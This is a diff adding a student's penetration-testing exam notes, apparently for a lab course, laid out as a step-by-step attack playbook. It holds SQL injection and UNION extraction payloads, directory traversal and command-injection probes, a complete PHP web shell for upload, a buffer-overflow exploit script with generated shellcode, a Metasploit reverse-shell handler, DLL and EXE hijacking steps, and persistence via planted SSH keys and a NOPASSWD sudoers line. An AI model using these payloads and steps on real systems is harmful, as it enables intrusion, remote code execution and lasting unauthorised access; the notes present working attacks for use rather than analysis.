@@ -1,0 +1,512 @@
+
+
+10.50.31.142
+
+
+nmap nmap -v -sT -Pn -T4 --script discovery 10.50.31.142 -p 80
+
+john' OR 1='1
+
+http://localhost:31051/login.php?username=john' OR 1='1&&passwd=john' OR 1='1
+
+
+/etc/hosts
+
+for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+
+
+
+
+
+---------
+*** ONLY ENCODINGS ARE ROT13 AND BASE64 ***
+gtfo bins
+wiremask.eu
+
+445   will be smb
+3389  will be arp   no need to banner grab these
+
+have dryrun info notes
+1) Host Discovery
+	Finding IP's
+2) Port Discovery
+	write commands in notes and paste them into the machines, that way you have the command saved
+	nmap -Pn -sT -T4 <IP> -p80,22,4444,2222,4242,9999,3389,8080
+	throw the results in the notes under the command
+3) Port Enumeration 
+	banner grab to verify results
+	nc <ip> <port>
+	if http, type something when hung and you will get html back
+	
+
+-----[web recon]-----
+
+firefox
+nikto -h <ip>							<------|
+throw intersting directories that are found in notes		       | run both to see if you get something different
+nmap -Pn -sT -T4 <IP> -p80 --script http-enum.nse		<------|
+
+[sql injection]
+john' OR 1='1
+
+go to network tab on dev tools
+find the post request in network tab and go to request tab, click raw button and copy info, paste it into url, at ? after the /login.html
+<IP>/login.html?username=john" OR 1='1&&passwd=john" OR 1='1
+
+maybe view page source for a more human readable format
+copy and paste info into notes
+*** CAN ONLY GET USERNAMES AND PASSWORDS FROM A LOGIN PAGE ***
+
+[SQL INJECTION (NON LOGIN (CHART ONE))]
+0. Identify SQL Database (NOT LOGIN)
+1. Identify method for SQL Database Variables
+   1.1 Integers? Strings? Varaible Names? Get? Post?
+2. Identify vulnerable field
+   2.1 You will try EVERY field				<IP>/thing.php?product=1 OR 1=1 ;#   (copy the vulnerable link into notes)
+3. Identify number of columns
+   3.1 UNION SELECT 1,2,3,4
+   3.2 Verify placement of columns
+4. Golden Statement
+   4.1 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; # <IP>/thing.php?product=7 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; #
+   4.2 Ensure golden statement lines up with step 3 (padding, formatting)
+5. Use Golden Statement to create custom queries		<IP>/thing.php?product=7 UNION SELECT user_id,name,username FROM siteusers.users; #
+6. ???
+7. Profit, Pass the exam, LEAVE COSC FOREVER
+
+selection=1 OR 1=1
+go through each number to find the vulnerable one
+
+
+
+
+--[FILE TO READ]--
+[directory traversal]
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
+read /etc/passwd
+see who has accounts
+
+read /etc/host
+see who else is connected to the box
+
+
+[command injection]
+test:
+; whoami
+*** IF IT DOESNT RETURN ANYTHING, CAN NOT USE COMMAND INJECTION ***
+
+
+
+
+
+--[MALICOUS FILE UPLOAD]--
+need to be able to upload a file
+need to be able to find the uploaded file
+
+script to upload:
+        
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<?php
+if($_GET['cmd']) {
+  system($_GET['cmd']);
+  }
+?>
+</pre>
+</BODY></HTML>
+
+** save it as a .php
+
+  upload it to the site.
+  then navigate to that file in the website
+  now we can basically do anything with this shell.
+
+
+-----[INSIDE BOX]-----
+first 2 commands to run:
+whoami
+hostname
+
+--[privilege escalation]--
+if the box has no questions on privilege escalation, there is no way to escalate priviledges
+
+
+first
+sudo -l
+
+SUID and SGID search
+find / -type f -perm /4000 -ls 2>/dev/null
+find / -type f -perm /2000 -ls 2>/dev/null
+find / -type f -perm /6000 -ls 2>/dev/null
+
+Buffer Overflow
+finding the file
+which gdb              {If the box has gdb,you WILL have to do a buffer overflow}
+
+
+-----[FINDING NEXT BOX]-----
+ip n - unreliable
+/etc/host
+
+[Host Discovery]
+ping sweep:
+for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+
+(when in doubt, run ping sweep on every box)
+
+look up and see whats off limits (or look at ttl, ttl=64 and low latency)
+
+
+
+############################
+## tunnel to the next box ##
+############################
+
+
+-----[Windows secureServ Buffer Overflow]-----
+
+build tunnel that goes to secure server (9999)
+
+in one window
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LPORT 0.0.0.0
+set LHOST 54321
+exploit
+
+in another window
+change port in python script to whatever port you used for the tunnel
+run the script
+boom
+
+
+
+-----[HIJACKING]-----
+if given .dll, .dll hijacking
+if given and executable, executable hijacking
+open file explorer --> view --> check file name extensions and hidden items
+*** MALWARE WILL BE GIVEN (.dll or .exe) ***
+
+
+[EXE HIJACKING]
+check Services
+look for blank or hilarious descriptions
+see properties
+look at path to executable
+go to executable
+rename the executable
+replace the executable with malicous file, then rename it with the previous name
+restart the box :)
+
+
+[DLL HIJACKING]
+follow hints to find the source code, the dll to target will be in there
+rename the dll and replace with malicous one
+rename the malicous file with the previous name of the .dll
+restart the box :)
+
+
+
+
+
+-----[Linux Buffer Overflow]-----
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+scp the file back
+
+if it take parameters - $: <file> dfgdrg
+if it take input it will as for an input and get hung up
+
+gdb <file>			- opens gdb with designated file
+pdisass main
+pdisass <call>			-anything with x86, ignore. if printf, ignore
+if its in red, its vulnerable
+
+go to wiremask and get pattern
+use pattern in script to find eip
+(already made, lin_buf.py)
+script:
+
+buffer = "<wiremask pattern generator>"
+
+eip = "BBBB"
+
+nop = '\x90' * 15
+
+print(buffer + eip + nop)
+
+
+run <<< $(python lin_buf.py)
+
+
+
+
+
+put eip in find offset section on wiremask
+instead of the 200 characters, put 1 and multiply it by the offset value
+
+buffer = "A" * <offset>
+
+eip = "BBBB"
+
+nop = '\x90' * 15
+
+print(buffer + eip + nop)
+
+
+input: run <<< $(python lin_buf.py)
+parameter: run $(python lin_buf.py)
+
+eip should be 0x42424242
+now find working eip
+
+env - gdb <file>		- loads just gdb, not gdb-peta
+show env
+unset env LINES
+unset env COLUMNS
+show env
+run				- when propted, overflow the buffer
+info proc map
+first address after heap to the last address above of the stack
+find /b 0xf7de1000 , 0xffffe000, 0xff, 0xe4
+        first addr   last addr   |dont change these|
+
+copy 5 or 6 of them
+0xf7de3b59
+0xf7f588ab
+0xf7f645fb
+0xf7f6460f
+0xf7f64aeb
+0xf7f64aff
+
+quit and go back to script
+
+paste and comment out the results in the script and comment out eip
+make a new eip and pick one of the commented out addresses ***MAKE SURE TO TYPE IT IN REVERSE***
+0xf7f645fb --> \xfb\x45\xf6\xf7
+
+buffer = "A" * 62
+
+#eip = "BBBB"
+#0xf7de3b59
+#0xf7f588ab
+#0xf7f6460f
+#0xf7f64aeb
+#0xf7f64aff
+#0xf7f645fb
+
+eip = "\xfb\x45\xf6\xf7"
+
+nop = '\x90' * 15
+
+print(buffer + eip + nop)
+
+
+open msfconsole
+
+
+msfconsole
+use payload/linux/x86/exec
+show options
+set CMD <command you want to run>
+show options 					- to confirm cmd is set
+generate -b "\x00" -f python
+
+copy what is showed
+
+buf =  b""
+buf += b"\xd9\xd0\xb8\x8e\x45\x7a\xb2\xd9\x74\x24\xf4\x5b"
+buf += b"\x33\xc9\xb1\x0b\x31\x43\x19\x03\x43\x19\x83\xc3"
+buf += b"\x04\x6c\xb0\x10\xb9\x28\xa2\xb7\xdb\xa0\xf9\x54"
+buf += b"\xad\xd7\x6a\xb4\xde\x7f\x6b\xa2\x0f\x1d\x02\x5c"
+buf += b"\xd9\x02\x86\x48\xde\xc4\x27\x89\x96\xac\x48\xe8"
+buf += b"\x35\x45\x97\xbd\x96\x1c\x76\x8c\x99"
+
+put the thingy in the script
+
+buffer = "A" * 62
+
+#eip = "BBBB"
+#0xf7de3b59
+#0xf7f588ab
+#0xf7f645fb
+#0xf7f6460f
+#0xf7f64aeb
+#0xf7f64aff
+
+eip = "\xfb\x45\xf6\xf7"
+
+buf =  b""
+buf += b"\xd9\xd0\xb8\x8e\x45\x7a\xb2\xd9\x74\x24\xf4\x5b"
+buf += b"\x33\xc9\xb1\x0b\x31\x43\x19\x03\x43\x19\x83\xc3"
+buf += b"\x04\x6c\xb0\x10\xb9\x28\xa2\xb7\xdb\xa0\xf9\x54"
+buf += b"\xad\xd7\x6a\xb4\xde\x7f\x6b\xa2\x0f\x1d\x02\x5c"
+buf += b"\xd9\x02\x86\x48\xde\xc4\x27\x89\x96\xac\x48\xe8"
+buf += b"\x35\x45\x97\xbd\x96\x1c\x76\x8c\x99"
+
+
+nop = '\x90' * 15
+
+print(buffer + eip + nop + buf)
+
+run the program with exploit
+sudo ./func <<< $(python lin_buf.py)
+sudo ./func $(python lin_buf.py)
+
+repeat the steps to find eip on adversary box
+put script in /tmp
+
+--trouble shooting steps--
+regenerate shell code a couple times
+change nop sled - 5,10,15,10
+use a different eip
+
+
+
+
+
+
+
+
+
+
+
+str cpy
+
+stringcat
+sprint
+
+
+
+
+
+-----[SSH KEY UPLOAD]-----
+after finding a place to upload a key (command injection or file upload)
+whoami - find out who u are
+
+on linops
+ssh-keygen -t rsa
+no passphrase
+cat ~/.ssh/id_rsa.pub
+
+on other box
+cat /etc/passwd - find users home directory
+ls -la /home/directory - check is .ssh exist
+mkdir /home/directory/.ssh/
+echo "<KEY>" >> /home/directory/.ssh/authorized_keys
+cat /home/directory/.ssh/authorized_keys
+
+
+##nano ~/.ssh/id_rsa.pub
+##echo "<key>" >> /home/directory/.ssh/authorized_keys
+
+
+
+ssh -p <port> <whatever user u did it to>@localhost
+
+
+-----[Extra Commands]-----
+
+which nc
+if the box has nc, try and banner grab through that box
+sudo find . -exec /bin/bash \; -quit
+(if you see a ./ in a gtfobins command, get rid of it)
+
+
+
+
+
+if you see a wall of text and you dont feel like reading it:
+right click --> view page source --> click links
+
+
+
+auditpol /get /category:* | findstr /i "success failure"
+
+persistence - run keys
+maybe schtask
+
+
+
+google bit shift calculator
+
+in .c >> means bit shift NOT APPEND
+
+
+echo "comrade ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
